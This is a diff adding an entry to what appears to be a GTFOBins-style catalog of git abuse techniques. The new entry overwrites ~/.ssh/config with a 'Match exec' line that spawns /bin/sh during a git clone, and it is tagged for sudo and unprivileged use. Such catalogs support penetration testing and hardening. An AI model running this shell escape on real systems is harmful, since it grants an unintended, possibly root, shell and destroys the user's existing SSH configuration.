@@ -66,4 +66,11 @@ functions:
           git --exec-path=. x -p
         shell: false
       unprivileged:
+  - code: |-
+      echo 'Match exec "/bin/sh 0<&2 1>&2"' > "$HOME/.ssh/config"; GIT_SSH_COMMAND="ssh -F ~/.ssh/config" git clone user@host:repo.git
+    comment: |-
+      Spawns the shell on the client, doesn't have to be the official config file location
+    contexts:
+      sudo:
+      unprivileged:           
 ...
